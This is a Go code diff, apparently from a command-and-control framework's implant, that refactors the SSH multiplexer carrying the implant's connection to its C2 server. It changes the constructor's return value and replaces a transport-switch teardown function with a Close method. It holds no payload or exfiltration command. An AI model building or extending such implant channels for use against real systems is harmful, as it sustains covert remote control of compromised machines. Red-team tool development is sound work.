@@ -55,7 +55,7 @@ var (
 // This includes API-used dialers/listeners, client port forwarders, and proxied traffic.
 type Comm struct {
 	// Core
-	SessionID     uint32            // Any multiplexer's physical connection is tied to an implant.
+	ID            uint32            // Any multiplexer's physical connection is tied to an implant.
 	RemoteAddress string            // The multiplexer may be tied to a pivoted implant.
 	ssh           ssh.Conn          // SSH Connection, that we will mux
 	config        *ssh.ClientConfig // We are the talking to the C2 server.
@@ -71,14 +71,15 @@ type Comm struct {
 
 // InitClient - Sets up and start a SSH connection (multiplexer)
 // around a logical connection/stream, or a Session RPC.
-func InitClient(conn net.Conn) (err error) {
+func InitClient(conn net.Conn) (comm *Comm, err error) {
+
 	// Return if we don't have what we need.
 	if conn == nil {
-		return errors.New("net.Conn is nil, cannot init Comm")
+		return nil, errors.New("net.Conn is nil, cannot init Comm")
 	}
 
 	// New SSH multiplexer Comm
-	comm := &Comm{
+	comm = &Comm{
 		conn:  conn,
 		mutex: &sync.RWMutex{},
 	}
@@ -89,7 +90,7 @@ func InitClient(conn net.Conn) (err error) {
 		// {{if .Config.Debug}}
 		log.Printf("failed to setup SSH client connection: %s", err.Error())
 		// {{end}}
-		return err
+		return nil, err
 	}
 
 	// {{if .Config.Debug}}
@@ -165,17 +166,12 @@ func (comm *Comm) verifyServer(hostname string, remote net.Addr, key ssh.PublicK
 func (comm *Comm) serveC2() {
 	// At the end of this function the Comm will be closed, so we clean it up.
 	defer func() {
-		// {{if .Config.Debug}}
-		log.Printf("Closing SSH client connection ...")
-		// {{end}}
-		err := comm.ssh.Close()
+		err := comm.Close()
 		if err != nil {
 			// {{if .Config.Debug}}
-			log.Printf("Error closing SSH connection: %s", err.Error())
+			log.Printf("Error closing Comm: %s)", err)
 			// {{end}}
 		}
-		// Remove this multiplexer from our active sockets.
-		Comms.Remove(comm.RemoteAddress)
 	}()
 
 	// For each incoming stream request, process concurrently. Blocking
@@ -420,9 +416,8 @@ func (comm *Comm) serveRequests() {
 	}
 }
 
-// PrepareCommSwitch - Kills all components of the Comm tied
-// to the current active C2, before a transport switch.
-func PrepareCommSwitch() (err error) {
+// Close - Close the Comm system: listeners, forwarders, and underlying tunnel
+func (c *Comm) Close() (err error) {
 
 	// Kill listeners, or notify wait.
 	for _, ln := range Listeners.active {
@@ -434,21 +429,16 @@ func PrepareCommSwitch() (err error) {
 		}
 	}
 
-	// Close the SSH layer
-	err = Comms.server.ssh.Close()
+	// Close the SSH layer, which under the hood triggers the tunnel to close itself
+	err = c.ssh.Close()
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Comm SSH close error before transport switch: %s", err.Error())
 		// {{end}}
 	}
 
-	// Close the custom RPC tunnel
-	err = Comms.server.conn.Close()
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("Comm underlying conn (Tunnel?) close error: %s", err.Error())
-		// {{end}}
-	}
+	// And remove from the Comms
+	Comms.Remove(c.ID)
 
-	return nil
+	return
 }
